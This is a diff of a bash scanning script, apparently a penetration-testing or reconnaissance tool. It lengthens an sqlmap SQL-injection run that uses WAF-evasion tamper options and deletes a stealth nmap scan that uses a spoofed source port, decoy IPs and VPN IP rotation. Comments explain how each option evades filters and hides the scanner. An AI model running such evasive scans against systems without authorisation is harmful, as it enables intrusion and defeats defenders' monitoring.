@@ -413,7 +413,7 @@ main() {
     #   percentage      → adds % between characters to break simple regex rules
     #   unmagicquotes   → escapes quotes with backslash to bypass quote filters
     echo -e "[+] SQLmap check for SQL injection"
-    run_cmd timeout 1800 \
+    run_cmd timeout 2700 \
 	        sqlmap -u "$url" \
                    --batch \
                    --random-agent \
@@ -423,29 +423,6 @@ main() {
                    --hpp \
                    --hex \
                    --tamper=space2comment,between,randomcase,charunicodeencode,charencode,equaltolike,multiplespaces,percentage,unmagicquotes
-    echo -e "\n\n"
-
-
-    vpn_rotate_ip no
-    random_timeout
-    # Nmap Open Ports and Service detection
-    #  note: Nmap gives incorrect results with VPN enabled	
-	# -sS  TCP SYN scan (stealthy scan)
-	# -Pn  Treat all hosts as online, skip host discovery	
-	# -n   Never do DNS resolution
-	# --source-port 53  Use given port number, Spoof Source Port
-    # -D RND:10  Decoy IPs, 
-	#            Your scan currently exposes your real IP clearly in every packet. 
-	#            -D RND:10 generates 10 fake source IPs alongside yours, flooding the target's logs with 11 apparent scanners. 
-	#            Defenders cannot easily isolate your real IP without deep traffic correlation.
-    echo -e "[+] Nmap Open Ports detection..."
-    run_cmd timeout 300 \
-            nmap "$host" \
-                 -sS \
-				 -Pn \
-				 -n \
-				 --source-port 53 \
-				 -D RND:10
     echo -e "\n\n"
 
 
